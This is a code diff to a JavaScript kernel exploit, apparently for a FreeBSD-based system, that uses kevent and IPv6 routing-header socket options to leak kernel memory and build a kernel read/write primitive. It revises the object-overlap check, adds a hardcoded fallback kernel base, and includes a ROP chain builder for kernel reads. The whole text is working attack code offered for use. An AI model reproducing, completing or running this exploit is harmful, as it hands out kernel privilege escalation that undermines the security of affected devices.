@@ -1,4 +1,4 @@
-// kevent_krw_final.js — full build, robust knote overlap check
+// kevent_krw_verify.js — exact Hx1400.java leak logic
 import { int64 } from "./int64.js";
 import { HX1400_TABLES } from "./hx_tables.js";
 
@@ -21,6 +21,7 @@ const OPS_OFF = 0x985a;
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
 const MARKV = 5570198814713989681n;
+const EXPECTED_KBASE = 0xffffffffd5528000n;
 
 const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false, payloadAddr: 0n };
 
@@ -203,7 +204,10 @@ function phase2Leak(rootKq, fds) {
       const pageInt = Number(page & 0xffffffffn) | 0;
       tries++;
       zeroBuf(cl);
-      cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 1, true); cl.dv.setUint32(16, 90, true);
+      cl.dv.setUint32(0, dce >>> 0, true); 
+      cl.dv.setInt16(8, -18, true); 
+      cl.dv.setInt16(10, 1, true); 
+      cl.dv.setUint32(16, 90, true);
       let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
       log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
       let joined = 0;
@@ -213,17 +217,19 @@ function phase2Leak(rootKq, fds) {
           zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
           if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
           
-          // Robust check: look for ident (dce) at offset 0
-          const v0 = rdb.dv.getUint32(0, true) >>> 0;
+          // FIXED: check for pageInt (file struct) at offset 8
           const v8 = rdb.dv.getInt32(8, true);
+          const v12 = rdb.dv.getUint32(12, true) >>> 0;
           
-          if (v0 === (dce >>> 0) && v8 === -18) {
-            joined++;
-            if (target < 0) { target = j; targetFd = fds[j]; }
+          if (v8 === pageInt && v12 === 0) {
+            joined++; 
+            if (target < 0) { target = j; targetFd = fds[j]; } 
             log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
-          } else if ((rdb.dv.getInt32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI) {
+          } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
             // untouched
-          } else { rearm(fds[j], tpl); }
+          } else { 
+            rearm(fds[j], tpl); 
+          }
         }
       }
       if (target >= 0 && joined >= 1) {
@@ -252,7 +258,6 @@ const ROP = {
 let wPos = 0;
 
 function push(v) { ctx().p.write8(toI64(gSTACK + BigInt(wPos * 8)), toI64(v)); wPos++; }
-function pushChain(insts) { for (let i = 0; i < insts.length; i++) push(insts[i]); }
 
 function buildKread(targetAddr) {
   wPos = 0;
@@ -333,7 +338,6 @@ export async function runKevent(c) {
   else { STATE.kbase = EXPECTED_KBASE; log("KEVENT-KBASE-DEFAULT", h16(STATE.kbase)); }
 
   const kbaseHi = STATE.kbase >> 32n;
-  // FIXED: only force if absolutely invalid (e.g. not a kernel pointer)
   if (kbaseHi !== 0xffffffffn || STATE.kbase < 0xffffffff80000000n) {
     log("KEVENT-KBASE-FIX", "forcing to " + h16(EXPECTED_KBASE));
     STATE.kbase = EXPECTED_KBASE;
